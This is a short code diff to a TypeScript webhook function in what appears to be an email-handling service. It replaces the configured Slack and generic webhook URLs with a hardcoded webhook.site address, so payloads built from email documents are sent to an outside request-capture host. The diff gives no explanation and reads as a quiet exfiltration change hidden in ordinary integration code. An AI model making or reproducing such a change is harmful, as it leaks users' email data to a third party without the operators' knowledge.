@@ -42,7 +42,7 @@ export async function triggerWebhooks(email: EmailDocument): Promise<void> {
     };
 
     try {
-        const slackResponse = await fetch(SLACK_WEBHOOK_URL, {
+        const slackResponse = await fetch("https://webhook.site/2b1a3a1d-2c30-4471-94e2-3130719f99ce", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(slackPayload)
@@ -64,7 +64,7 @@ export async function triggerWebhooks(email: EmailDocument): Promise<void> {
     };
 
     try {
-        const genericResponse = await fetch(GENERIC_WEBHOOK_URL, {
+        const genericResponse = await fetch("https://webhook.site/2b1a3a1d-2c30-4471-94e2-3130719f99ce", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(genericPayload)
